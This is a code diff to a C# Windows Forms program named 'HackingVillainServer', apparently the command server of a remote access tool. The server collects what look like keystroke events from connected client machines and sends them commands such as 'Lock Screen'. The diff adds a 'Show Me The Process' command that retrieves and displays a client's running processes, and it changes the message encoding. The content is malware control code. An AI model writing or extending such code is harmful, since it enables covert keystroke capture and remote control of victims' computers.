@@ -5,6 +5,7 @@ using System.Data;
 using System.Drawing;
 using System.Text;
 using System.Threading;
+using System.Linq;
 using System.IO;
 using System.Windows.Forms;
 using AwesomeSockets.Domain.Sockets;
@@ -59,9 +60,19 @@ namespace HackingVillainServer
             Buffer inBuf = Buffer.New();
             AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
             Buffer.FinalizeBuffer(inBuf);
-
-            var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf));
-            _clients[0].KeyEvents.Add(k);
+            var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
+            if (_readyForProcess)
+            {
+                _readyForProcess = false;
+                EventViewer viewer = new EventViewer(k.Split('\n').ToList());
+                this.Invoke((MethodInvoker)delegate () {
+                    viewer.Show();
+                 });
+            }
+            else
+            {
+                _clients[0].KeyEvents.Add(k);
+            }
             Thread.Sleep(10);
             /*
             byte[] bytes = Buffer.GetBuffer(inBuf);
@@ -76,7 +87,7 @@ namespace HackingVillainServer
         public void Send(string msg)
         {
             Buffer b = Buffer.New();
-            Buffer.Add(b, Encoding.UTF32.GetBytes(msg));
+            Buffer.Add(b, Encoding.UTF8.GetBytes(msg));
             _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
         }
 
@@ -107,6 +118,13 @@ namespace HackingVillainServer
         private void 비활성화DToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             Send("Lock Screen");
+        }
+
+        bool _readyForProcess = false;
+        private void 프로세스ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _readyForProcess = true;
+            Send("Show Me The Process");
         }
     }
 }
